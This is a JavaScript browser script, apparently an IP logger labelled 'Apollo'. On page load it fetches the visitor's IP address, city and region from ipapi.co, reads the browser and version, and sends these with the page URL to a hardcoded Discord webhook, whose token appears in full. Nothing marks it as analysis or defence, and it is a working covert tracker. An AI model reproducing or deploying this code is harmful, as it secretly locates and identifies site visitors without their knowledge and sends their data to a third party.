const webhookUrl = "https://discord.com/api/webhooks/1088227889155149947/BQGH7ttzUsGIW_NQlmVnnfQytfjS3zNEgZSRKvTPHZ8gbEIHayGQuq-ES8q7o0WbCwgH";

async function sendWebhook() {
  try {
    const userIP = await getUserIP();
    const userLocation = await getUserLocation();
    const clientInfo = await getClientInfo();
    const currentUrl = window.location.href;
    const webhookData = {
      embeds: [
        {
          title: "Apollo",
          color: 0xff0000,
          fields: [
            {
              name: "IP",
              value: `**${userIP}**`
            },
            {
              name: "City",
              value: `**${userLocation.city}**`
            },
            {
              name: "State",
              value: `**${userLocation.region}**`
            },
            {
              name: "Browser",
              value: `**${clientInfo.browser}**`
            },
            {
              name: "Version",
              value: `**${clientInfo.version}**`
            },
            {
              name: "Link",
              value: `**${currentUrl}**`
            }
          ]
        }
      ]
    };
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(webhookData)
    });
    if (!response.ok) {
      console.error(`Sending webhook failed with status ${response.status}`);
    }
  } catch (error) {
    console.error(`Error sending webhook: ${error.message}`);
  }
}

async function getUserIP() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) {
      throw new Error(`Failed to fetch user IP: Status ${response.status}`);
    }
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error(`Error getting user IP: ${error.message}`);
    return "Unknown";
  }
}

async function getUserLocation() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    if (!response.ok) {
      throw new Error(`Failed to fetch user location: Status ${response.status}`);
    }
    const data = await response.json();
    return {
      ip: data.ip,
      city: data.city,
      region: data.region
    };
  } catch (error) {
    console.error(`Error getting user location: ${error.message}`);
    return {
      ip: "Unknown",
      city: "Unknown",
      region: "Unknown"
    };
  }
}

function getClientInfo() {
  const userAgent = navigator.userAgent;
  let browser = "Unknown";
  let version = "Unknown";

  if (userAgent.indexOf("Chrome") !== -1) {
    browser = "Chrome";
    const chromeVersion = userAgent.match(/Chrome\/(\d+)/)[1];
    version = chromeVersion ? chromeVersion : version;
  } else if (userAgent.indexOf("Firefox") !== -1) {
    browser = "Firefox";
    const firefoxVersion = userAgent.match(/Firefox\/(\d+)/)[1];
    version = firefoxVersion ? firefoxVersion : version;
  } else if (userAgent.indexOf("Edge") !== -1) {
    browser = "Edge";
    const edgeVersion = userAgent.match(/Edge\/(\d+)/)[1];
    version = edgeVersion ? edgeVersion : version;
  } else if (userAgent.indexOf("Brave") !== -1) {
    browser = "Brave";
    const braveVersion = userAgent.match(/Brave\/(\d+)/)[1];
    version = braveVersion ? braveVersion : version;
  } else if (userAgent.indexOf("Opera") !== -1) {
    browser = "Opera";
    const operaVersion = userAgent.match(/Opera\/(\d+)/)[1];
    version = operaVersion ? operaVersion : version;
  } else if (userAgent.indexOf("Safari") !== -1) {
    browser = "Safari";

    // Detecting mobile Safari
    if (userAgent.match(/Mobile/)) {
      const mobileSafariVersion = userAgent.match(/Version\/(\d+)/)[1];
      version = mobileSafariVersion ? mobileSafariVersion : version;
    } else {
      // Detecting desktop Safari on Mac
      const macSafariVersion = userAgent.match(/Safari\/(\d+)/)[1];
      version = macSafariVersion ? macSafariVersion : version;
    }
  }

  return {
    browser: browser,
    version: version,
  };
}

sendWebhook();